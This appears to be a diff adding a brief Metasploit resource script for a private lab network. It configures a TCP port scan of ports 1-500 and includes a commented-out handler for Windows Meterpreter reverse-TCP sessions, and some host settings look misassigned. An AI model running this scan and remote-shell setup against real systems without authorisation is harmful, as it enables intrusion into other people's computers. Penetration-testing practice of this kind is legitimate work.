@@ -1,0 +1,14 @@
+# port scanner 
+use auxiliary/scanner/portscan/tcp
+set ports 1-500
+set LHOST 192.168.217.200
+
+
+
+# run meterpreter script
+#use exploit/multi/handler
+#set PAYLOAD windows/meterpreter/reverse_tcp
+#set RHOST 192.168.217.200
+#set ExitOnSession false
+#exploit -j -z
+
